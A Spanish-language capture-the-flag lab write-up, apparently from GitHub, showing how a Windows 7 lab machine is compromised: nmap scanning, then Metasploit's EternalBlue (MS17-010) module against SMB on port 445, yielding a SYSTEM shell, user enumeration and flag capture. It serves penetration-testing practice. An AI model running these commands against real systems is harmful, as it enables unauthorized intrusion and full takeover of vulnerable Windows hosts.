## 🛰️**Reconocimiento**
Una vez localizada la IP de la máquina víctima, verifico la conectividad con un simple `ping`:

```bash
ping 192.168.1.56
```
![Captura de pantalla 2025-04-03 140128](https://github.com/user-attachments/assets/6e5b95bc-8c50-4f6e-ba9b-1a226857c9be)

- **`-c1`** → Ejecuta el **ping** una sola vez.

Confirmada la conectividad, realizo un reconocimiento con **nmap**🔎:

```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn -vvv 192.168.1.56 -oN escaneo
```

![image](https://github.com/user-attachments/assets/0f24137a-adf9-48a2-b97a-47adb14ea011)

Una vez finalizado, visualizo los resultados:

```bash
batcat escaneo -l ruby
```

![image](https://github.com/user-attachments/assets/9ccc5543-4740-4039-a117-df283fdaaca1)

En la salida se observa que el puerto 445/TCP está abierto, con un servicio SMB sobre un sistema operativo Windows 7 Home Basic SP1 (build 7601).
Esta versión es conocida por ser vulnerable a EternalBlue (MS17-010).

## 🧨**Explotación del Puerto 445 (SMB) con Metasploit**

Sabiendo que estamos frente a un sistema operativo Windows 7 vulnerable a Eternalblue, empiezo ejecutando Metasploit:

```bash
msfconsole
```
Busco exploits relacionados con EternalBlue:

```bash
search eternalblue
```
![image](https://github.com/user-attachments/assets/444a78fc-aabc-417b-8f95-6b469ab8cc24)

Selecciono el primer módulo de explotación y reviso su configuración:

```bash
use 0
show options
```
![image](https://github.com/user-attachments/assets/a7c4c8cb-df69-446a-adeb-11b5354c6bdc)

De todas sus opciones solo tenemos que configurar **RHOSTS** con la IP de la máquina victima.

```bash
set RHOSTS 192.168.1.56
```
![image](https://github.com/user-attachments/assets/638c9750-3002-4475-8f34-e8e8c6946dea)

Una vez configurado, lanzo el exploit: `run`.

![image](https://github.com/user-attachments/assets/0c2e866b-c545-4b46-a3b0-5ccb7ede265e)

¡Éxito! Se ha abierto una sesión Meterpreter contra la máquina víctima. El siguiente paso es comprobar qué usuario tenemos y, si es necesario, escalar privilegios.

## 🔍**Enumeración de Usuarios**

Dentro de la sesión, lanzo una shell:

```bash
shell
```
![image](https://github.com/user-attachments/assets/2601e79b-63e2-4431-810f-623a6fe5c506)

Compruebo qué usuario estamos utilizando:

```bash
whoami
```
![image](https://github.com/user-attachments/assets/9b900636-0808-4a86-a347-baa28419699c)

Se confirma que tenemos acceso como `nt authority\system`, el usuario más privilegiado del sistema.

Entre los usuarios destacan Admin y Lola.

```bash
net users
```
![image](https://github.com/user-attachments/assets/2667f276-d06b-4ee4-87b5-bf2bd94a83fd)

## 🎯**Obtención de Flags**

Accedo al escritorio del usuario Lola para capturar la Flag correspondiente:

![image](https://github.com/user-attachments/assets/b7f15e3c-cfb5-473b-ab15-b9e446c90c63)

Repito el proceso para el usuario Admin:

![image](https://github.com/user-attachments/assets/c63f0035-11db-4ba2-9fdd-7ad06774d216)

✅ Explotación exitosa con EternalBlue, acceso como SYSTEM, y captura de flags de usuarios clave.🚀


